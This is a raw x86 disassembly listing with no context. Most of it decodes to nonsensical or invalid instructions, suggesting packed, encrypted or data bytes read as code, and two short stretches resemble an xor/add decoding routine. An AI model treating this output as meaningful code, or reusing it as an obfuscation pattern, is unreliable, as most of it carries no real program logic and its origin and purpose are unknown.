  4085ad:	push   edi
  4085ae:	dec    eax
  4085af:	xor    BYTE PTR [esi],dl
  4085b1:	push   ecx
  4085b2:	(bad)  
  4085b3:	aad    0x2b
  4085b5:	push   es
  4085b6:	sub    BYTE PTR fs:[ebp+0x7964d5a7],bh
  4085bd:	adc    ebx,DWORD PTR [ebx]
  4085bf:	rcr    BYTE PTR [edx+0x16],1
  4085c2:	sahf   
  4085c3:	mov    ebp,DWORD PTR [edi-0x7b]
  4085c6:	sbb    DWORD PTR [esi+0x78],0xffffffbf
  4085ca:	xchg   ecx,eax
  4085cb:	mov    bl,BYTE PTR [edx+0x51]
  4085ce:	dec    edi
  4085cf:	sub    dl,dh
  4085d1:	push   esp
  4085d2:	ja     0x4085b0
  4085d4:	inc    ecx
  4085d5:	sbb    BYTE PTR [edi],0x2d
  4085d8:	in     eax,0x45
  4085da:	sahf   
  4085db:	or     DWORD PTR [edx+0x7c],ecx
  4085de:	add    DWORD PTR [ebx-0x45],ebx
  4085e1:	int3   
  4085e2:	out    0x7f,eax
  4085e4:	cmc    
  4085e5:	mov    dl,0xed
  4085e7:	das    
  4085e8:	sub    al,0x16
  4085ea:	mov    bl,BYTE PTR [ebp-0x2fdec626]
  4085f0:	mov    WORD PTR [ebx],cs
  4085f2:	pop    edx
  4085f3:	int3   
  4085f4:	mov    esp,0xe433e667
  4085f9:	jg     0x40863c
  4085fb:	or     edx,DWORD PTR [edx+0x34a6a163]
  408601:	arpl   dx,dx
  408603:	mov    al,0xa9
  408605:	rol    DWORD PTR [esi-0x66],0x57
  408609:	leave  
  40860a:	nop
  40860b:	js     0x4085a1
  40860d:	cmp    al,0xa7
  40860f:	push   ds
  408610:	fsubr  QWORD PTR [edx+0x75]
  408613:	dec    eax
  408614:	cmp    eax,0x6898e574
  408619:	dec    edx
  40861a:	ds aad 0x92
  40861d:	aas    
  40861e:	das    
  40861f:	mov    ah,0x34
  408621:	inc    edi
  408622:	imul   esi,DWORD PTR [eax-0x63],0xdc37fa9b
  408629:	xlat   BYTE PTR ds:[ebx]
  40862a:	adc    al,0x58
  40862c:	enter  0x3e31,0xb2
  408630:	mov    edi,0x7a5587a
  408635:	ins    BYTE PTR es:[edi],dx
  408636:	cmp    BYTE PTR [esi-0x1738a7b0],cl
  40863c:	in     al,dx
  40863d:	mov    dl,0xb5
  40863f:	add    al,0x2f
  408641:	aaa    
  408642:	shl    edi,0xc7
  408645:	mov    eax,ds:0xe8714c0f
  40864a:	or     esi,ebp
  40864c:	or     DWORD PTR [esi-0x382e8993],0xf64cbb60
  408656:	ins    BYTE PTR es:[edi],dx
  408657:	push   esi
  408658:	sahf   
  408659:	shr    BYTE PTR es:[eax+0x37398920],0x81
  408661:	sub    edx,0xe158dc07
  408667:	(bad)  
  408668:	xchg   esi,eax
  408669:	es xchg edx,esi
  40866c:	pop    ebp
  40866d:	int    0xf7
  40866f:	pop    esi
  408670:	not    BYTE PTR [ebx-0x3c9d81d9]
  408676:	dec    esp
  408677:	retf   0x7
  40867a:	retf   0xd1c1
  40867d:	dec    esi
  40867e:	jno    0x408624
  408680:	add    DWORD PTR gs:[edi-0x3],0xb0d2d143
  408688:	or     BYTE PTR [edi+edx*2+0x5e],dl
  40868c:	ja     0x408688
  40868e:	mov    dl,0x7f
  408690:	mov    eax,0x1e46082c
  408695:	lods   eax,DWORD PTR ds:[esi]
  408696:	adc    ecx,DWORD PTR [edx+0x7e]
  408699:	enter  0xb8bb,0xfe
  40869d:	adc    cl,BYTE PTR [esi+0x36631581]
  4086a3:	inc    ebx
  4086a4:	add    bl,bh
  4086a6:	xor    eax,0x5d890043
  4086ab:	hlt    
  4086ac:	sbb    DWORD PTR ds:0x4336ef,0x433727
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx+0x517acf4a],ecx
  4086ca:	inc    edi
  4086cb:	mov    dl,dh
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	cli    
  4086d4:	mov    eax,ds:0x7651e022
  4086d9:	das    
  4086da:	cmp    esi,ebx
  4086dc:	or     BYTE PTR [edx+0x1b],bh
  4086df:	sahf   
  4086e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086e1:	xor    BYTE PTR [edx+0x4c],bh
  4086e4:	repnz arpl bp,sp
  4086e7:	mov    dl,0xd7
  4086e9:	mov    eax,ds:0x38d0f74a
  4086ee:	fcmovu st,st(2)
  4086f0:	inc    edx
  4086f1:	stos   DWORD PTR es:[edi],eax
  4086f2:	jno    0x40874a
  4086f4:	sar    BYTE PTR [ecx+0x77],0xdc
  4086f8:	add    al,0xe9
  4086fa:	jne    0x4086f4
  4086fc:	cmp    eax,0xaea724bf
  408701:	jmp    0xb030:0xd97b498
  408708:	lds    eax,FWORD PTR [edx]
  40870a:	mov    ebx,0x48e339f2
  40870f:	pop    edi
  408710:	outs   dx,BYTE PTR ds:[esi]
  408711:	icebp  
  408712:	loope  0x40875f
  408714:	add    BYTE PTR [ebp-0x9676567],ah
  40871a:	mov    DWORD PTR [esi+0xf5a642d],eax
  408720:	xor    al,BYTE PTR [ebp-0x67dce4a5]
  408726:	loopne 0x408725
  408728:	adc    al,0xb5
  40872a:	out    dx,eax
  40872b:	rcr    DWORD PTR [edx-0x1031c190],1
  408731:	arpl   WORD PTR [edi+ebx*2-0x56],cx
  408735:	xchg   esp,eax
  408736:	call   0xac73:0x3e47c753
  40873d:	sar    DWORD PTR [ebx+0x2e16630c],cl
  408743:	aaa    
  408744:	cmp    al,0xa2
  408746:	xor    BYTE PTR [ebx+ebp*4],ch
  408749:	pop    edi
  40874a:	add    al,ch
  40874c:	or     BYTE PTR [edx],dl
  40874e:	repz shl dl,1
  408751:	repz ret 
  408753:	fsubr  st,st(6)
  408755:	xchg   BYTE PTR [ebx-0x1b],cl
  408758:	and    ch,bl
  40875a:	ret    
  40875b:	sub    al,0x52
  40875d:	mov    edi,0xbb85e0ca
  408762:	(bad)  
  408763:	mul    DWORD PTR [edi-0x30]
  408766:	scas   al,BYTE PTR es:[edi]
  408767:	jecxz  0x408787
  408769:	retf   0x6014
  40876c:	mov    ds:0x4c1dd532,eax
  408771:	adc    ebx,eax
  408773:	ins    DWORD PTR es:[edi],dx
  408774:	cmp    bl,BYTE PTR [ebx-0x45]
  408777:	mov    edx,0xa94a900
  40877c:	jmp    0x4087d9
  40877e:	(bad)  
  40877f:	jl     0x408742
  408781:	mov    ch,ah
  408783:	dec    eax
  408784:	cmp    al,0xf0
  408786:	mov    al,ds:0x319370d5
  40878b:	add    eax,0xf9cc5f4f
  408790:	fwait
  408791:	adc    DWORD PTR [ecx+0x11],esi
  408794:	inc    esi
  408795:	pop    ecx
  408796:	ds xchg ecx,eax
  408798:	sub    DWORD PTR [ebx],esp
  40879a:	mov    ds:0x906f6a4e,al
  40879f:	xor    BYTE PTR ds:0x6f9d8da9,dh
  4087a5:	maxps  xmm0,xmm6
  4087a8:	ret    
  4087a9:	jo     0x4087c5
  4087ab:	lea    ecx,[esi]
  4087ad:	loop   0x408758
  4087af:	adc    dh,BYTE PTR [eax+0x47]
  4087b2:	xor    eax,0xffffffc1
  4087b5:	or     al,0xac
  4087b7:	sbb    eax,0xa35459a7
  4087bc:	sub    eax,0x5357962e
  4087c1:	adc    bl,ah
  4087c3:	stos   BYTE PTR es:[edi],al
  4087c4:	and    DWORD PTR [edx],edi
  4087c6:	cmp    al,0x3c
  4087c8:	mov    ah,0x67
  4087ca:	cmp    ebx,DWORD PTR [edi+eiz*4]
  4087cd:	pop    edx
  4087ce:	sub    edx,ebx
  4087d0:	xchg   DWORD PTR [ecx+ecx*4-0x2a],eax
  4087d4:	imul   edi,DWORD PTR [esi+0xc81659d],0x80568506
  4087de:	(bad)  [ecx+ecx*2-0x741eaacf]
  4087e5:	cmp    edi,ebx
  4087e7:	out    0xa5,al
  4087e9:	or     edx,DWORD PTR [eax+0x5b]
  4087ec:	les    esi,FWORD PTR [eax+edi*2]
  4087ef:	cs push ds
  4087f1:	fadd   st(3),st
  4087f3:	popf   
  4087f4:	cmc    
  4087f5:	push   cs
  4087f6:	push   ss
  4087f7:	out    0x51,al
  4087f9:	jmp    0x76af:0x768bdad4
  408800:	dec    edi
  408801:	ja     0x4087e9
  408803:	and    al,0x3f
  408805:	int3   
  408806:	clc    
  408807:	dec    cl
  408809:	fstp   QWORD PTR [ecx+0x7fa15c7f]
  40880f:	lahf   
  408810:	or     eax,0xc1e720d1
  408815:	rcr    DWORD PTR [esp+esi*8+0x77],1
  408819:	mov    ebp,0x752f6bb
  40881e:	inc    ebx
  40881f:	cld    
  408820:	push   esp
  408821:	push   0x39
  408823:	(bad)  
  408825:	sub    cl,BYTE PTR [ecx-0x11]
  408828:	and    dh,BYTE PTR [esp+edi*2+0x4026e775]
  40882f:	scas   eax,DWORD PTR es:[edi]
  408830:	rol    DWORD PTR [edi-0x4],0x4d
  408834:	loope  0x408804
  408836:	add    BYTE PTR [ebx-0x289cee78],bh
  40883c:	inc    ebp
  40883d:	jl     0x4087ed
  40883f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408840:	pop    ds
  408841:	adc    ebp,DWORD PTR [ecx]
  408843:	cs stc 
  408845:	mov    al,0x22
  408847:	or     eax,0x9ab2d2b7
  40884c:	loope  0x40885e
  40884e:	(bad)  
  40884f:	push   ebp
  408850:	sub    eax,0x9440a224
  408855:	lock test ecx,esp
  408858:	ja     0x40889f
  40885a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40885b:	pop    edx
  40885c:	fist   DWORD PTR [edi]
  40885e:	push   edi
  40885f:	aam    0x91
  408861:	cs (bad) 
  408863:	sbb    dl,BYTE PTR [esi]
  408865:	dec    esi
  408866:	das    
  408867:	cdq    
  408868:	ret    0x10c5
  40886b:	jmp    0x63f877be
  408870:	add    esi,DWORD PTR [ecx]
  408872:	xchg   BYTE PTR [esi+0x3addfe67],bl
  408878:	or     DWORD PTR [ecx+0x40e5fb5c],edx
  40887e:	and    al,0xd1
  408880:	js     0x40889e
  408882:	xchg   esi,eax
  408883:	push   ss
  408884:	inc    esp
  408885:	add    eax,0x7e3d14f6
  40888a:	and    al,0x64
  40888c:	pop    esp
  40888d:	fs enter 0xc201,0xef
  408892:	cli    
  408893:	xlat   BYTE PTR ds:[ebx]
  408894:	add    eax,0xc164576c
  408899:	retf   0xea9e
  40889c:	pop    edx
  40889d:	lock push edi
  40889f:	mov    dl,0xd3
  4088a1:	stos   DWORD PTR es:[edi],eax
  4088a2:	dec    BYTE PTR [ecx-0x3e2f76ee]
  4088a8:	daa    
  4088a9:	mov    al,cs:0x1b898971
  4088af:	outs   dx,DWORD PTR ds:[esi]
  4088b0:	adc    bl,BYTE PTR [ebp+0x30]
  4088b3:	ja     0x40888a
  4088b5:	or     eax,0x4719b047
  4088ba:	adc    edi,ebx
  4088bc:	sbb    eax,0xb6cb5866
  4088c1:	imul   eax,edx,0x8397b5f8
  4088c7:	leave  
  4088c8:	fcomp  DWORD PTR [edx-0x5f591587]
  4088ce:	jp     0x4088a5
  4088d0:	and    al,0x36
  4088d2:	repz test BYTE PTR [ebp-0x5c],bl
  4088d6:	mov    BYTE PTR [eax-0x65],dh
  4088d9:	jg     0x40890b
  4088db:	push   0x47990044
  4088e0:	sub    eax,0x9020b2a4
  4088e5:	shr    BYTE PTR [ecx],0x48
  4088e8:	es add al,cl
  4088eb:	shl    ch,cl
  4088ed:	pop    ebp
  4088ee:	dec    ebx
  4088ef:	jmp    0xedf7:0x20a2ff3e
  4088f6:	push   ebp
  4088f7:	repz dec esi
  4088f9:	mov    BYTE PTR [eax],bl
  4088fb:	icebp  
  4088fc:	ror    DWORD PTR [ebx+0x63358100],cl
  408902:	ss inc ebx
  408904:	add    BYTE PTR [edx],ch
  408906:	jl     0x408908
  408908:	add    BYTE PTR [esi-0x75],ah
  40890b:	dec    ebp
  40890c:	cld    
  40890d:	adc    DWORD PTR ds:0x4336db,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x433653,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43361f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x433727,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0x6a0b462c
  408968:	pop    ebx
  408969:	mov    al,0xd4
  40896b:	jle    0x4089eb
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	xchg   edi,eax
  408972:	pop    ss
  408973:	mov    cl,0x9
  408975:	dec    edi
  408976:	dec    ebp
  408977:	pushf  
  408978:	push   ebx
  408979:	fisub  DWORD PTR [eax-0x76]
  40897c:	cmp    al,0x9d
  40897e:	fwait
  40897f:	imul   edx,ebx,0xd6c44094
  408985:	inc    edi
  408986:	ja     0x408928
  408988:	test   eax,0x7d52431f
  40898d:	xchg   BYTE PTR [ebp+0x57e2b971],ah
  408993:	addr16 ret 
  408995:	sar    DWORD PTR [edx+0x55],cl
  408998:	imul   eax,esi,0x5f
  40899b:	add    eax,0xe00dfc7c
  4089a0:	dec    BYTE PTR [eax]
  4089a2:	retf   0x442a
  4089a5:	cld    
  4089a6:	rcr    DWORD PTR [edx+0x4b],cl
  4089a9:	stc    
  4089aa:	clc    
  4089ab:	lods   al,BYTE PTR ds:[esi]
  4089ac:	xchg   ebp,eax
  4089ad:	jle    0x408a0a
  4089af:	inc    eax
  4089b0:	bound  ecx,QWORD PTR [esi+0x43ea160a]
  4089b6:	lea    esp,[edi-0x1d2a805c]
  4089bc:	pop    ebx
  4089bd:	dec    ecx
  4089be:	fwait
  4089bf:	jae    0x408a2c
  4089c1:	lahf   
  4089c2:	sbb    ah,0xed
  4089c5:	cmp    esp,edx
  4089c7:	or     BYTE PTR [esi-0x2a],cl
  4089ca:	sbb    al,0x5e
  4089cc:	iret   
  4089cd:	lock aad 0xab
  4089d0:	add    edx,esp
  4089d2:	push   ebx
  4089d3:	sub    al,0xd4
  4089d5:	jle    0x4089ca
  4089d7:	(bad)  
  4089d8:	les    esi,FWORD PTR [edx+0x320c3c5a]
  4089de:	test   al,0x83
  4089e0:	or     al,0xf7
  4089e2:	jmp    0x4089c4
  4089e4:	scas   eax,DWORD PTR es:[edi]
  4089e5:	inc    ecx
  4089e6:	dec    ecx
  4089e7:	inc    eax
  4089e8:	mov    bl,0xce
  4089ea:	dec    edx
  4089eb:	sub    BYTE PTR [esi+0x59a3b375],0xb7
  4089f2:	jb     0x4089fa
  4089f4:	cmp    DWORD PTR [ebx+0x6],edx
  4089f7:	jns    0x4089b9
  4089f9:	std    
  4089fa:	mov    edi,0x97ae3da1
  4089ff:	jo     0x408a6c
  408a01:	ret    0x6dff
  408a04:	sbb    bh,BYTE PTR [esi+0x26]
  408a07:	lea    esi,[ecx-0x5d]
  408a0a:	stos   BYTE PTR es:[edi],al
  408a0b:	push   es
  408a0c:	or     eax,DWORD PTR [edx+0x7706e5a2]
  408a12:	and    al,0x46
  408a14:	adc    dl,BYTE PTR [edx]
  408a16:	xor    edx,DWORD PTR [edi+0x20]
  408a19:	sbb    al,0xda
  408a1b:	lods   al,BYTE PTR ds:[esi]
  408a1c:	test   BYTE PTR [ecx],bh
  408a1e:	clc    
  408a1f:	adc    al,0x9d
  408a21:	scas   al,BYTE PTR es:[edi]
  408a22:	cdq    
  408a23:	inc    edi
  408a24:	or     al,0x38
  408a26:	jbe    0x408a82
  408a28:	xlat   BYTE PTR ds:[ebx]
  408a29:	nop
  408a2a:	fstp   DWORD PTR [eax]
  408a2c:	and    ah,ch
  408a2e:	mov    edx,0x90aa941e
  408a33:	jl     0x408a93
  408a35:	rol    DWORD PTR [edx-0x4410605c],0xce
  408a3c:	sub    esi,ecx
  408a3e:	clc    
  408a3f:	jne    0x408a58
  408a41:	(bad)  
  408a42:	hlt    
  408a43:	push   eax
  408a44:	fbld   TBYTE PTR ds:0x5db2e8d8
  408a4a:	and    al,0x91
  408a4c:	sub    ch,BYTE PTR [eax+ebx*8-0x7c]
  408a50:	imul   ebp,ecx,0x71
  408a53:	stos   BYTE PTR es:[edi],al
  408a54:	mov    cl,0x2c
  408a56:	(bad)  
  408a57:	or     ah,BYTE PTR [ebx]
  408a59:	xchg   ebp,eax
  408a5a:	add    bl,bl
  408a5c:	jb     0x408aa4
  408a5e:	mov    bl,0x10
  408a60:	stc    
  408a61:	adc    DWORD PTR ds:0x10887564,0x12
  408a68:	imul   ecx,DWORD PTR [edi],0x3a
  408a6b:	add    ebp,ebx
  408a6d:	ins    BYTE PTR es:[edi],dx
  408a6e:	push   eax
  408a6f:	loopne 0x408a1e
  408a71:	cld    
  408a72:	fbstp  TBYTE PTR [esi-0x19]
  408a75:	lahf   
  408a76:	dec    ebx
  408a77:	sub    dh,ah
  408a79:	inc    eax
  408a7a:	mov    al,ds:0xc37f3bdc
  408a7f:	int    0x66
  408a81:	mov    ds:0x2ffa7dd1,eax
  408a86:	inc    edx
  408a87:	popf   
  408a88:	and    al,0xc8
  408a8a:	fdivr  st(2),st
  408a8c:	cmc    
  408a8d:	pop    edx
  408a8e:	pushf  
  408a8f:	popf   
  408a90:	cmc    
  408a91:	xadd   BYTE PTR [ebp+0x45819c2a],ah
  408a98:	dec    ecx
  408a99:	test   eax,0x825b9a50
  408a9e:	jb     0x408abe
  408aa0:	xchg   edx,eax
  408aa1:	(bad)  
  408aa2:	xchg   edi,eax
  408aa3:	add    al,0x61
  408aa5:	popf   
  408aa6:	repz xchg ebx,eax
  408aa8:	(bad)  
  408aa9:	imul   ecx,DWORD PTR [edi+0x6d881fde],0x7109da2d
  408ab3:	pushf  
  408ab4:	or     esi,DWORD PTR [ecx-0x2c5b1ea5]
  408aba:	je     0x408a84
  408abc:	dec    edx
  408abd:	pop    es
  408abe:	lock retf 0x4537
  408ac2:	and    al,BYTE PTR [ecx+0x39]
  408ac5:	xor    ebp,ecx
  408ac7:	pop    es
  408ac8:	mov    ecx,0x73347131
  408acd:	out    0x9,eax
  408acf:	scas   eax,DWORD PTR es:[edi]
  408ad0:	push   cs
  408ad1:	lea    ebp,[edi-0x1eaf12b8]
  408ad7:	sbb    BYTE PTR [eax-0x7ddb4887],dl
  408add:	rol    BYTE PTR [edi+0xe639110],1
  408ae3:	rol    DWORD PTR fs:[ebx+edi*4],cl
  408ae7:	and    DWORD PTR ds:0x5492348f,ecx
  408aed:	inc    eax
  408aee:	loop   0x408b6f
  408af0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408af1:	push   ebx
  408af2:	stc    
  408af3:	fs xor dl,ah
  408af6:	lock pop es
  408af8:	and    ch,BYTE PTR [esi-0x4d9af968]
  408afe:	and    edi,DWORD PTR [eax]
  408b00:	pop    ds
  408b01:	jecxz  0x408b3c
  408b03:	xchg   ebx,eax
  408b04:	pop    esi
  408b05:	dec    ecx
  408b06:	dec    ebx
  408b07:	xchg   ebp,eax
  408b08:	sbb    BYTE PTR [ecx+0x6f],bl
  408b0b:	mov    cl,0xb
  408b0d:	xchg   ecx,eax
  408b0e:	outs   dx,BYTE PTR ds:[esi]
  408b0f:	das    
  408b10:	call   0x8b0:0x7cefb662
  408b17:	jae    0x408ace
  408b19:	pushfw 
  408b1b:	mov    ecx,0x12fd09ca
  408b20:	cmp    BYTE PTR [eax],cl
  408b22:	ins    BYTE PTR es:[edi],dx
  408b23:	dec    si
  408b25:	ror    BYTE PTR [ecx*4+0x3bda5e0f],1
  408b2c:	mov    ebp,0xdbbd7be3
  408b31:	inc    ecx
  408b32:	shl    DWORD PTR [edi],cl
  408b34:	(bad)  [edi-0x6f]
  408b37:	inc    edi
  408b38:	outs   dx,BYTE PTR ds:[esi]
  408b39:	je     0x408b46
  408b3b:	mov    eax,ds:0x29957ebf
  408b40:	inc    eax
  408b41:	jnp    0x408b47
  408b43:	inc    esi
  408b44:	fstp   TBYTE PTR [ebx+0x5]
  408b47:	cld    
  408b48:	idiv   ebx
  408b4a:	(bad)  
  408b4d:	popf   
  408b4e:	push   ebx
  408b4f:	jbe    0x408b3f
  408b51:	adc    edx,eax
  408b53:	addr16 mov esp,0xea3d2ff5
  408b59:	out    dx,eax
  408b5a:	jb     0x408b51
  408b5c:	enter  0xf006,0x94
  408b60:	inc    edi
  408b61:	retf   0xbb98
  408b64:	cld    
  408b65:	or     al,0x25
  408b67:	dec    eax
  408b68:	add    BYTE PTR [eax],dh
  408b6a:	sbb    eax,0xdc01437f
  408b6f:	nop
  408b70:	push   ebx
  408b71:	bound  ebx,QWORD PTR [edi+0x19]
  408b74:	rol    DWORD PTR [eax-0x73],1
  408b77:	ja     0x408b86
  408b79:	push   ss
  408b7a:	lea    esi,[ebp-0x2cc6dbdb]
  408b80:	push   ss
  408b81:	das    
  408b82:	mov    eax,0x14e89d3a
  408b87:	cmp    BYTE PTR [ebp+0x4b],0x9f
  408b8b:	ror    DWORD PTR [eax],cl
  408b8d:	pusha  
  408b8e:	or     DWORD PTR [edx-0x7c],ebp
  408b91:	adc    al,0x79
  408b93:	aaa    
  408b94:	xor    esi,DWORD PTR [ebx-0x6c68f47c]
  408b9a:	jmp    0x0:0x1d850f
  408ba1:	mov    eax,DWORD PTR [ebp+0x8]
  408ba4:	mov    ecx,DWORD PTR [ebp-0x10]
  408ba7:	xor    eax,esi
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	or     BYTE PTR [edi-0x61],0x89
  408bf4:	data16 sar BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	aam    0x1f
  408bfe:	fsub   QWORD PTR [edi-0x18]
  408c01:	inc    ecx
  408c02:	cmp    BYTE PTR ds:0x94f482a3,dl
  408c08:	jno    0x408bca
  408c0a:	jno    0x408b8f
  408c0c:	lahf   
  408c0d:	je     0x408c1d
  408c0f:	es inc ebx
  408c11:	mov    esp,0x6aa58617
  408c16:	xor    DWORD PTR [esi],ebx
  408c18:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c1a:	cmp    ebp,DWORD PTR cs:[edi+0x18]
  408c1e:	sub    dh,BYTE PTR [ebp+0x4f]
  408c21:	imul   ebx,DWORD PTR [esi-0x50],0xcfc95924
  408c28:	test   DWORD PTR [esi+0x2eb63724],ebx
  408c2e:	sbb    BYTE PTR [eax+0x55],dl
  408c31:	mov    cl,0xc2
  408c33:	aaa    
  408c34:	adc    al,0x23
  408c36:	test   BYTE PTR [edi+edx*8-0x5af513aa],0xa
  408c3e:	mov    ?,WORD PTR [edx-0x6edd7a00]
  408c44:	js     0x408c21
  408c46:	mov    ?,WORD PTR [edx+0xc0b4989]
  408c4c:	or     eax,0x3b7f81c4
  408c51:	addr16 in eax,0xe2
  408c54:	sti    
  408c55:	mov    eax,ds:0x4ec93ac9
  408c5a:	xchg   DWORD PTR [ecx],esp
  408c5c:	iret   
  408c5d:	imul   ecx,DWORD PTR [ecx+0x50795636],0x8af003a8
  408c67:	or     eax,0x973f0dfd
  408c6c:	popa   
  408c6d:	sub    BYTE PTR [edi+edi*8],dl
  408c70:	jp     0x408c31
  408c72:	fld    TBYTE PTR [eax+0x68887f69]
  408c78:	(bad)  
  408c79:	lods   al,BYTE PTR ds:[esi]
  408c7a:	mov    ch,0xac
  408c7c:	repz inc ebx
  408c7e:	cli    
  408c7f:	ret    0x6f71
  408c82:	mov    ds:0xc833921f,eax
  408c87:	mov    ebp,0xbce76027
  408c8c:	shl    DWORD PTR [edi],1
  408c8e:	or     ebp,DWORD PTR [ebx]
  408c90:	xor    ebp,0xf567ae08
  408c96:	xor    dl,bh
  408c98:	cmp    ch,BYTE PTR [eax+0x56e0b887]
  408c9e:	pop    ds
  408c9f:	mov    ebp,0x50e046f8
  408ca4:	push   0x2e26c36c
  408ca9:	dec    ebx
  408caa:	push   ebx
  408cab:	fucomi st,st(1)
  408cad:	bound  edx,QWORD PTR [eax]
  408caf:	pop    ebp
  408cb0:	jg     0x408c4c
  408cb2:	pop    ecx
  408cb3:	dec    ecx
  408cb4:	add    DWORD PTR [eax+ebx*4],ecx
  408cb7:	cli    
  408cb8:	cmp    dl,dl
  408cba:	inc    edi
  408cbb:	xor    eax,0x5c98adb1
  408cc0:	stos   DWORD PTR es:[edi],eax
  408cc1:	xor    BYTE PTR [ebp+ecx*8+0x7f533a76],ah
  408cc8:	(bad)  
  408ccb:	cmp    edi,DWORD PTR ds:0x4922f4c9
  408cd1:	cmp    bh,bh
  408cd3:	iret   
  408cd4:	pop    ds
  408cd5:	mov    ecx,0xe6722e9f
  408cda:	sub    ch,bh
  408cdc:	jmp    0xe92c1c89
  408ce1:	mov    WORD PTR fs:[esi-0x51],es
  408ce5:	mov    ch,0x6
  408ce7:	pop    ss
  408ce8:	mov    ch,0x30
  408cea:	adc    BYTE PTR [edx-0x5d055de2],dh
  408cf0:	adc    cl,al
  408cf2:	mov    ch,al
  408cf4:	mov    edx,0x6a5972d0
  408cf9:	sbb    eax,DWORD PTR [edx]
  408cfb:	pop    esi
  408cfc:	leave  
  408cfd:	and    edi,DWORD PTR [edi+0x28f5f179]
  408d03:	and    BYTE PTR [ebp-0x7d],bl
  408d06:	jp     0x408d54
  408d08:	and    BYTE PTR [edx+0x1ad349fb],dh
  408d0e:	jle    0x408d22
  408d10:	cmc    
  408d11:	aad    0xb7
  408d13:	cld    
  408d14:	lahf   
  408d15:	retf   0xce68
  408d18:	pop    edi
  408d19:	retf   0x3ce0
  408d1c:	and    DWORD PTR [edx+eax*4+0x44],ebx
  408d20:	push   0xc9389f61
  408d25:	fst    DWORD PTR [ebp+0x1e]
  408d28:	sbb    al,0x77
  408d2a:	je     0x408d6d
  408d2c:	leave  
  408d2d:	mov    ds:0x5200b92d,al
  408d32:	sbb    bh,bh
  408d34:	out    dx,eax
  408d35:	mov    esp,0x9e99532a
  408d3a:	push   edx
  408d3b:	mov    WORD PTR ds:0x5651530b,cs
  408d41:	in     al,0xdb
  408d43:	push   esi
  408d44:	pop    edx
  408d45:	and    eax,0x16c6e16d
  408d4a:	xchg   ecx,eax
  408d4b:	inc    ebx
  408d4c:	adc    al,0x4b
  408d4e:	mov    dh,0xad
  408d50:	push   ebx
  408d51:	mov    esi,DWORD PTR [edx-0x79c9ff31]
  408d57:	mov    dl,bl
  408d59:	stos   BYTE PTR es:[edi],al
  408d5a:	gs cmp ecx,esp
  408d5d:	pop    edi
  408d5e:	jmp    0x56a6541f
  408d63:	xchg   ebx,eax
  408d64:	add    eax,0xe7589454
  408d69:	fldl2e 
  408d6b:	jmp    DWORD PTR [ebx+ecx*4]
  408d6e:	cs jno 0x408cf1
  408d71:	test   BYTE PTR [ebp+0x734fee18],ah
  408d77:	inc    ecx
  408d78:	out    dx,eax
  408d79:	pop    ds
  408d7a:	int3   
  408d7b:	and    al,0x99
  408d7d:	jae    0x408d9a
  408d7f:	fcmovbe st,st(6)
  408d81:	sub    dh,BYTE PTR [ecx+0x0]
  408d84:	dec    edx
  408d85:	xchg   di,ax
  408d87:	push   eax
  408d88:	xor    bh,bh
  408d8a:	sub    BYTE PTR [eax-0x56],bh
  408d8d:	mov    edx,0xf44b4992
  408d92:	int    0x23
  408d94:	outs   dx,DWORD PTR ds:[esi]
  408d95:	dec    eax
  408d96:	ja     0x408d56
  408d98:	and    BYTE PTR [ebp+ebp*8-0x24],cl
  408d9c:	fwait
  408d9d:	(bad)  
  408d9e:	pop    esp
  408d9f:	pop    ebp
  408da0:	cmp    DWORD PTR [edx-0x1ace673a],ebp
  408da6:	(bad)
  408daa:	jmp    0xc7314aff
  408daf:	mov    edi,0x95d41cb2
  408db4:	or     edi,DWORD PTR [eax-0x638c10ef]
  408dba:	out    dx,eax
  408dbb:	mov    eax,ds:0xf02b7bac
  408dc0:	bound  ebp,QWORD PTR [edx]
  408dc2:	mov    edx,0xeff23f2c
